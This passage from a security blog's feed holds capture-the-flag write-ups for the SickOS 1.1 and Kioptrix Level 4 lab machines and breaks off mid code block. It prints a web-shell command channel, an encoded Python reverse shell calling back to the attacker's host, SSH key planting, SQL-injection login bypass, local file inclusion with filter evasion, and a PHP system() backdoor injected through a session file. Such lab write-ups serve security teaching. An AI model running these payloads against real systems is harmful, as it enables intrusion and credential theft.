</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ cat blabla.pub  | sed &rsquo;s#+#%2b#g'
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure></p>

<p>To store public key as <code>authorized_keys</code>:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+&lt;/a>&lsquo;ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX&rsquo;>~www-data/.ssh/authorized_keys&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>We verify the successful upload:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys&lt;/a>&rdquo;
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX</span></code></pre></td></tr></table></div></figure></p>

<p>It does not work, the server is still asking password, even when we try to set more restricted permission:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
</span><span class='line'>&lt;a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x77;&#119;&#x77;&#45;&#100;&#97;&#x74;&#x61;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#56;&#x30;&#x2e;&#49;&#x36;&#x39;">&#x77;&#x77;&#x77;&#x2d;&#100;&#x61;&#116;&#97;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#56;&#x30;&#x2e;&#x31;&#54;&#x39;&lt;/a>&rsquo;s password:&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys&lt;/a>&rdquo;
</span><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh&lt;/a>&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>We come back to this later. Trying different payload, we encode the following
command and invoke via our backdoor, the second output is ascii encoded using
Burp Encoder:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span> <span class="n">_</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">;</span> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)));</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1400</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</span></code></pre></td></tr></table></div></figure></p>

<p>This is how we got the remote shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1400&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30">http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30&lt;/a>&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>We connect to MySQL again, this time we noticed that there is user <code>sickos</code> with the same password as mysql <code>root</code>, that is <code>john@123</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
</span><span class='line'>mysql -uroot -pjohn@123 mysql
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 165
</span><span class='line'>Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Copyright &copy; 2000, 2015, Oracle and/or its affiliates. All rights reserved.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>mysql> SELECT User,Host,Password FROM mysql.user;
</span><span class='line'>SELECT User,Host,Password FROM mysql.user;
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>| User             | Host      | Password                                  |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>| root             | localhost | &lt;em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| root             | sickos    | &lt;/em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| root             | 127.0.0.1 | &lt;em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| root             | ::1       | &lt;/em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>5 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure></p>

<p>His shell uses the same password and we can easily escalate to uid 0.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/var/www/wolfcms/public$ su sickos
</span><span class='line'>su sickos
</span><span class='line'>Password: john@123&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sickos@SickOs:/var/www/wolfcms/public$&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>[sudo] password for sickos: john@123&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Matching Defaults entries for sickos on this host:
</span><span class='line'>    env_reset,
</span><span class='line'>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>User sickos may run the following commands on this host:
</span><span class='line'>    (ALL : ALL) ALL
</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo su
</span><span class='line'>sudo su&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@SickOs:/var/www/wolfcms/public# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@SickOs:~# ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 40
</span><span class='line'>drwx&mdash;&mdash;  3 root root 4096 Dec  6 21:14 .
</span><span class='line'>drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>-rw&mdash;&mdash;-  1 root root 3724 Dec  6 21:18 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root 3106 Apr 19  2012 .bashrc
</span><span class='line'>drwx&mdash;&mdash;  2 root root 4096 Sep 22 08:33 .cache
</span><span class='line'>-rw&mdash;&mdash;-  1 root root   22 Dec  5 06:24 .mysql_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  140 Apr 19  2012 .profile
</span><span class='line'>-rw&mdash;&mdash;-  1 root root 5230 Dec  6 21:14 .viminfo
</span><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>cat a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>If you are viewing this!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>ROOT!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have Succesfully completed SickOS1.1.
</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure></p>

<p>Reading the <code>auth.log</code>, we also found out the reason why ssh did not worked:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www</span></code></pre></td></tr></table></div></figure></p>

<p>Unfortunately our user could not change this permission.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 4]]></title>
    <link href="http://73696e65.github.io/blog/2015/08/25/kioptrix-level-4/"/>
    <updated>2015-08-25T18:18:32+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/08/25/kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/#">Kioptrix: Level 1.3 (#4)</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.154 -sT&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.49BETA4 ( &lt;a href="https://nmap.org">https://nmap.org&lt;/a> ) at 2015-04-26 23:39 CEST
</span><span class='line'>Nmap scan report for 192.168.80.154
</span><span class='line'>Host is up (0.0015s latency).
</span><span class='line'>Not shown: 566 closed ports, 430 filtered ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>22/tcp  open  ssh
</span><span class='line'>80/tcp  open  http
</span><span class='line'>139/tcp open  netbios-ssn
</span><span class='line'>445/tcp open  microsoft-ds
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds</span></code></pre></td></tr></table></div></figure></p>

<p>There is a member login on the <a href="http://192.168.80.154/index.php">http://192.168.80.154/index.php</a> site, we try the
following credentials (SQLi):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Username: Administrator
</span><span class='line'>Password: test' or &lsquo;1&rsquo;=&lsquo;1</span></code></pre></td></tr></table></div></figure></p>

<p>We logged into member site and after a few seconds found the local file
inclusion vulnerability. Filtering the <code>etc</code> string could be easily evaded for displaying <code>/etc/passwd</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=robert">http://192.168.80.154/member.php?username=robert&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../etc/passwd">http://192.168.80.154/member.php?username=../../../../../etc/passwd&lt;/a> -> User ../../../../..//passwd
</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetct/passwd">http://192.168.80.154/member.php?username=../../../../../eetct/passwd&lt;/a> -> User ../../../../../et/passwd
</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd&lt;/a> -> /../../../../../etc/passwd.php
</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00&lt;/a>&rdquo;
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
</span><span class='line'>john:x:1001:1001:,,,:/home/john:/bin/kshell
</span><span class='line'>robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span></code></pre></td></tr></table></div></figure></p>

<p><code>smbmap</code> output reveals:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbmap -H 192.168.80.154
</span><span class='line'>[+] Finding open SMB ports&hellip;.
</span><span class='line'>[+] User SMB session establishd on 192.168.80.154&hellip;
</span><span class='line'>[+] IP: 192.168.80.154:445  Name: 192.168.80.154
</span><span class='line'>    Disk                                                    Permissions
</span><span class='line'>    &mdash;-                                                    &mdash;&mdash;&mdash;&ndash;
</span><span class='line'>    print$                                              NO ACCESS
</span><span class='line'>    IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure></p>

<p>Now we try to inject php backdoor. For this purpose, we use our session file.
The file has a fixed location <code>/var/lib/php5/sess_</code> with the appended session
cookie name:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>myusername|s:13:&ldquo;Administrator&rdquo;;mypassword|s:15:&ldquo;test' or &lsquo;1&rsquo;=&lsquo;1&rdquo;;</span></code></pre></td></tr></table></div></figure></p>

<p>As we can see, the myusername session variable could be used to easily inject our code:</p>

<p>We need to login using these credentials:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Username: &lt;?php system($_REQUEST[cmd]); ?>
</span><span class='line'>Password: test' or &lsquo;1&rsquo;=&lsquo;1</span></code></pre></td></tr></table></div></figure></p>

<p>Now we have a backdoor, that uses parameter <code>cmd</code>. Digging deeper, we use python to execute reverse shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
